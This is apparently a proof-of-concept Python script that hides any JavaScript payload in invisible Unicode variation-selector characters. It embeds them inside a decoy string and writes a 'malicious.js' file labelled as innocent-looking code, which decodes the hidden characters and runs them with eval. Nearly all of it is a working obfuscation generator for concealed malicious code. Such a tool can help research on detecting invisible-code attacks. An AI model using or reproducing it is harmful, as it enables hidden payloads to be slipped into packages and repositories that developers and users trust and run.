#!/usr/bin/env python3
"""
PoC: Unicode Variation Selector Obfuscation Generator
Usage: python3 poc.py -p 'console.log("payload")'
"""

import sys
import argparse

def encode_to_variation_selectors(payload: str) -> str:
    result = []
    for byte in payload.encode('utf-8'):
        code_point = 0xE0100 + byte
        result.append(chr(code_point))
    return ''.join(result)

def decode_from_variation_selectors(hidden: str) -> str:
    result = []
    for char in hidden:
        code_point = ord(char)
        if 0xE0100 <= code_point <= 0xE01FF:
            result.append(code_point - 0xE0100)
        elif 0xFE00 <= code_point <= 0xFE0F:
            result.append(code_point - 0xFE00)
    return bytes(result).decode('utf-8')

def main():
    parser = argparse.ArgumentParser(description='Generate obfuscated JavaScript with hidden Unicode payloads')
    parser.add_argument('-p', '--payload', required=True, help='JavaScript payload to hide')
    parser.add_argument('-o', '--output', default='malicious.js', help='Output filename (default: malicious.js)')
    parser.add_argument('--decoy', default="console.log('Hello, World!');", help='Decoy code string (default: console.log)')
    
    args = parser.parse_args()
    
    PAYLOAD = args.payload
    OUTPUT_FILE = args.output
    DECOY = args.decoy
    
    # Generate hidden payload
    hidden_payload = encode_to_variation_selectors(PAYLOAD)
    
    # Calculate decoy split point to embed hidden content
    split_point = min(20, len(DECOY) // 2)
    obfuscated = DECOY[:split_point] + hidden_payload + DECOY[split_point:]
    
    # Print status
    print("=" * 60)
    print("PAYLOAD:", PAYLOAD)
    print("DECOY:", DECOY)
    print()
    print("DECODED BACK:", decode_from_variation_selectors(hidden_payload))
    print("=" * 60)
    
    # Generate self-contained malicious JavaScript
    js_code = f'''// Innocent looking code
const data = "{obfuscated}";

function decode(s) {{
    let result = [];
    for (let c of s) {{
        let cp = c.codePointAt(0);
        if (cp >= 0xE0100 && cp <= 0xE01FF) {{
            result.push(cp - 0xE0100);
        }} else if (cp >= 0xFE00 && cp <= 0xFE0F) {{
            result.push(cp - 0xFE00);
        }}
    }}
    return String.fromCharCode(...result);
}}

// Run hidden payload
eval(decode(data));
'''
    
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write(js_code)
    
    print(f"\n[+] Created {OUTPUT_FILE} - run with: node {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
